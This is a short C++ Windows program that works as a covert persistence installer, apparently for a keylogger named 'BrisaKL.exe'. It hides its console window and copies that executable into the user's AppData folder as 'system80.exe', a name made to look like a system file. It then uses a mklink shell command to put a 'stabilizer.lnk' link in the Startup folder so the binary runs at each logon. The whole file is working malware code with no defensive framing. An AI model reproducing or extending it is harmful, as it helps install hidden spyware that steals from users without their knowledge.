#include <iostream>
#include <Windows.h>
#include <bits/stdc++.h>
#include <unistd.h>


int main(){
	FreeConsole();
	char name[24];
	DWORD tamanho = 24;
	
	GetUserName(name, &tamanho);
	
	std::string username = name;
		
	char * cwd;
	cwd = (char*) malloc( FILENAME_MAX * sizeof(char) );
	getcwd(cwd,FILENAME_MAX);
		
	std::string raiz = cwd;
	std::string init = raiz + "\\BrisaKL.exe";
	std::string data = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\";
	std::string inicializar = "Start Menu\\Programs\\Startup\\";
		
	std::ifstream arquivo_origem(init, std::ios::binary);
	std::ofstream arquivo_destino(data + "system80.exe", std::ios::binary);
	
	// Copiar o conteúdo do arquivo de origem para o arquivo de destino
	arquivo_destino << arquivo_origem.rdbuf();
	
	// Fechar os arquivos
	arquivo_origem.close();
	arquivo_destino.close();
	
	std::string file = data + "system80.exe";
	std::string link = data+inicializar+"stabilizer.lnk";
	    
	std::string comando = "mklink \"" + link + "\" \"" + file + "\"";
	
	system(comando.c_str());
	
	return 0;
}
